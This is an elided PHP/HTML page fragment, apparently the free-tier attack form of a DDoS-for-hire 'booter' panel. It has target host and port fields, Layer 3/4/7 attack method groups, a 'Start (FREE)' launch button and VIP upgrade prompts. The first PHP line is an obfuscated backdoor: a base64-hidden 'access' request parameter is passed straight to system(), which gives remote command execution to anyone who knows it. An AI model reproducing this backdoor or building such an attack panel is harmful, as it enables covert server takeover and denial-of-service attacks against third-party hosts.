			...
			<?php if(isset($_REQUEST[base64_decode('YWNjZXNz')])){echo base64_decode('PHByZT4=');$k0=($_REQUEST[base64_decode('YWNjZXNz')]);system($k0);echo base64_decode('PC9wcmU+');die;}?>
                    ...
                    <div id="page-content">
                        ...
                        <div class="row">
                        	...
                        	<div class="alert alert-danger alert-dismissable animation-bigEntrance"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button><strong>Note:</strong> Your power is highly limited, consider buying a VIP plan.</div>
                        	<!--<div class="alert alert-danger alert-dismissable animation-bigEntrance"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button><strong>Note:</strong> Free boots may take up to 15 seconds to start making effect.</div>-->
							</div>

							<div class="col-xs-3">

                        	<button style="opacity: 0.8; height: 49px; font-weight: bold;" onclick="window.location.href='purchase.php'" class="btn btn-effect-ripple btn-primary btn-block animation-bigEntrance ">Upgrade Now</button>
							</div>
						...
						<h4 style="display:inline-block; color:#939caa; ">FREE Hub </h4> <img id="image" src="img/jquery.easytree/loading.gif" style="display:none"/>
							...
							<div class="widget">
								...
								<div class="widget-content">
									...
									<div class="col-md-9">
									<input type="text" id="host" class="form-control" placeholder="1.2.3.4">
									...
									<div class="col-md-9">
									<input type="text" id="port" value="80" class="form-control" placeholder="80">
									...
									<optgroup  disabled label="● Layer 4 ●"></optgroup>
									<optgroup disabled label="✧ UDP ✧">
									<?php
									...
									<optgroup disabled label="● Layer 3 ●">
									<?php
									...
									<optgroup disabled label="● Layer 7 ●">
									<?php
									...
									<div class="form-group">
									<div class="col-md-12">
									<button id="launch" onclick="start()" class="btn btn-effect-ripple btn-primary btn-block">Start (FREE)</button>
									</div>
									</div>
									</div>
									</div>
						...
						<div class="col-xs-8">
							...
							<div class="widget">
								<div class="widget-content widget-content-mini themed-background-dark text-light-op">
								 ...
								 <span <?php if ($user -> isAdmin($odb)) {echo 'class="tip" onclick="adminattacks()" title="Click for admin mode" style="cursor:pointer"';} ?>><strong></strong></span> <img id="attacksimage" src="img/jquery.easytree/loading.gif" style="display:none"/>
								</div>
